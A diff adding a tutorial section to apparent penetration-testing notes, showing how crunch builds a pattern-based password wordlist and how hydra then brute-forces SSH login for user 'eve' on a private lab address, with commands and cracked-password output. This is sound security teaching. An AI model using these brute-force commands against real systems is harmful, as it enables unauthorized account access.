@@ -198,3 +198,54 @@ Speed.#1.........:  3144.1 kH/s (0.28ms) @ Accel:256 Loops:3 Thr:1 Vec:8
 Recovered........: 1/1 (100.00%) Digests
 ...
 ```
+
+## crunch
+
+[crunch](https://www.kali.org/tools/crunch/) is a command-line tool that can be used to help build a custom dictionary, usually based on a known portion of the password, for a brute force attack. This tool generally requires attackers to have a rough idea of the password's "base" and is mainly helpful for automatically adding formatted characters.
+
+### Example
+
+Consider an attacker who has reason to suspect the user `eve`'s password contains "`lab`" as its base. Let's say (in a highly simplified example) the password policy was 6 character minimum, one uppercase, one lowercase, and one digit. Combining this knowledge with the suspected base of the password, crunch could generate password guesses as follows:
+
+```shell-session
+$ crunch 6 6 -t Lab%%% > wordlist    
+Crunch will now generate the following amount of data: 7000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 1000
+```
+
+Resulting in the following file:
+
+{% code title="wordlist" %}
+```
+Lab000
+Lab001
+Lab002
+Lab003
+Lab004
+Lab005
+Lab006
+Lab007
+Lab008
+Lab009
+...
+```
+{% endcode %}
+
+This can then be fed into hydra as a regular wordlist:
+
+```shell-session
+$ hydra -l eve -P wordlist 192.168.210.214 ssh -o eve.hydra                        
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+...
+[DATA] attacking ssh://192.168.210.214:22/
+...
+[22][ssh] host: 192.168.210.214   login: eve   password: Lab123
+1 of 1 target successfully completed, 1 valid password found
+...
+```
+
+While this is a simple example, more information about rule construction can be found using `man crunch`.
